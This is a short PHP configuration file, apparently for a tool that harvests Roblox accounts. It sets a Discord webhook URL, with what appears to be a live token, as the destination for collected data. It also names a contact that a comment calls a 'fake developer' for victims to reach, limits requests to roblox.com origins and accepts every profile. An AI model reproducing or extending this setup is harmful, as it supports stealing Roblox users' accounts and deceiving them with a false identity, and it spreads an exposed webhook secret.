<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/886356871550738532/Q0Sxi91Y6n0iankbeIByrWy0707eqYdH0DuzTBlnjD_h2-odc4EPk3fZqvUlsbBsNcig";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
